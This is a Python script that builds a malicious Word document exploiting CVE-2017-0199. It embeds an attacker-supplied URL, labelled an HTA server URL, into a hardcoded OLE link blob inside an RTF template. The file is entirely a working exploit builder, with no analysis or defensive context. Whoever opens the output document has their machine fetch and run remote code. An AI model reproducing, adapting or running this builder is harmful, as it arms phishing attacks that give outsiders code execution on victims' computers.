#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
$ python exploit.py http://www.baidu.com/
Output : cve-2017-0199.doc
"""

import os
import sys


EXPLOIT_TEMPLATE = "cve-2017-0199.rtf"
EXPLOIT_FILENAME = "cve-2017-0199.doc"


def uhexstr(data):
    """Translte url into hex(unicode(url)) format.
    """
    data = [
        "{}00".format(hex(ord(char)).replace('0x', ''))
        for char in data
    ]
    return "".join(data)


def exploit(url):
    """Generate a vulnerable doc from CVE-2017-0199.
    """
    if not os.path.exists(EXPLOIT_TEMPLATE):
        print('{} not found'.format(EXPLOIT_TEMPLATE))
        return False

    data = ''
    with open(EXPLOIT_TEMPLATE, 'r') as f:
        data = f.read()

    ministream_data = ""
    ministream_data += "01000002090000000100000000000000" # 00000000: ................
    ministream_data += "0000000000000000a4000000e0c9ea79" # 00000010: ...............y
    ministream_data += "f9bace118c8200aa004ba90b8c000000" # 00000020: .........K......
    ministream_data += uhexstr(url)
    ministream_data += "00000000795881f43b1d7f48af2c825d" # 000000a0: ....yX..;..H.,.]
    ministream_data += "c485276300000000a5ab0000ffffffff" # 000000b0: ..'c............
    ministream_data += "0609020000000000c000000000000046" # 000000c0: ...............F
    ministream_data += "00000000ffffffff0000000000000000" # 000000d0: ................
    ministream_data += "906660a637b5d2010000000000000000" # 000000e0: .f`.7...........
    ministream_data += "00000000000000000000000000000000" # 000000f0: ................
    ministream_data += "100203000d0000000000000000000000" # 00000100: ................
    ministream_data += "00000000000000000000000000000000" # 00000110: ................
    ministream_data += "00000000000000000000000000000000" # 00000120: ................
    ministream_data += "00000000000000000000000000000000" # 00000130: ................
    ministream_data += "00000000000000000000000000000000" # 00000140: ................
    ministream_data += "00000000000000000000000000000000" # 00000150: ................
    ministream_data += "00000000000000000000000000000000" # 00000160: ................
    ministream_data += "00000000000000000000000000000000" # 00000170: ................
    ministream_data += "00000000000000000000000000000000" # 00000180: ................
    ministream_data += "00000000000000000000000000000000" # 00000190: ................
    ministream_data += "00000000000000000000000000000000" # 000001a0: ................
    ministream_data += "00000000000000000000000000000000" # 000001b0: ................
    ministream_data += "00000000000000000000000000000000" # 000001c0: ................
    ministream_data += "00000000000000000000000000000000" # 000001d0: ................
    ministream_data += "00000000000000000000000000000000" # 000001e0: ................
    ministream_data += "00000000000000000000000000000000" # 000001f0: ................

    data = data.replace("MINISTREAM_DATA", ministream_data)
    with open(EXPLOIT_FILENAME, "w") as f:
        f.write(data)

    print('Output: {}'.format(EXPLOIT_FILENAME))
    return True


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("{} <hta_server_url>".format(sys.argv[0]))
        sys.exit(1)

    exploit(sys.argv[1])